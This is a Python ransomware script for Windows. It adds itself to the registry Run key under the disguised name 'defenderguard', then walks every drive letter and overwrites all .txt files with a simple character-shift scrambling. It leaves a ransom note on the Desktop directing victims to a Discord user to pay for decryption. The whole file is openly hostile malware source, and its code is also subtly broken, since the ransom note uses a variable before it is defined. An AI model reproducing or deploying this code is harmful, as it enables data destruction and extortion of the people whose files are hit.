import os
import sys
import time
import random
import string
import shutil
import winreg

def add_to_startup():
    """Add script to startup registry"""
    key = winreg.HKEY_CURRENT_USER
    sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        registry_key = winreg.OpenKey(key, sub_key, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, "defenderguard", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(registry_key)
    except WindowsError as e:
        print(f"Error adding to startup: {e}")

def encrypt_file(filename):
    """Encrypt a single file"""
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            content = f.read()
        encrypted = ''.join(chr(ord(c) + 1) for c in content)
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(encrypted)
        return True
    except Exception as e:
        print(f"Error encrypting {filename}: {e}")
        return False

def encrypt_drive(drive):
    """Try to encrypt all text files on a drive"""
    try:
        for root, dirs, files in os.walk(drive):
            for file in files:
                if file.endswith('.txt') and file != 'ransom.txt':
                    filepath = os.path.join(root, file)
                    if not encrypt_file(filepath):
                        print(f"Skipping {filepath}")
    except Exception as e:
        print(f"Error on drive {drive}: {e}")

def main():
    # Add to startup
    add_to_startup()
    
    # Create ransom note
    ransom_text = f"""
YOUR FILES HAVE BEEN ENCRYPTED

To decrypt your files, do this:
Download Discord or use the web version on https://discord.com/app on your phone or another device since we encrypted browsers.
Friend this user: colabvm
Ask us to decrypt it along with the ID.
Your unique ID: {key}

"""
    key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    ransom_path = os.path.join(os.path.expanduser('~'), 'Desktop', 'READ_ME.html')
    with open(ransom_path, 'w', encoding='utf-8') as f:
        f.write(ransom_text.format(key=key))
    
    # Encrypt all drives
    drives = ['C:', 'D:', 'E:', 'F:', 'G:', 'H:', 'I:', 'J:', 'K:', 'L:', 'M:', 'N:', 'O:', 'P:', 'Q:', 'R:', 'S:', 'T:', 'U:', 'V:', 'W:', 'X:', 'Y:', 'Z:']
    for drive in drives:
        if os.path.exists(drive):
            print(f"Attempting to encrypt {drive}")
            encrypt_drive(drive)
    
    # Wait before exit
    time.sleep(5)

if __name__ == "__main__":
    main()
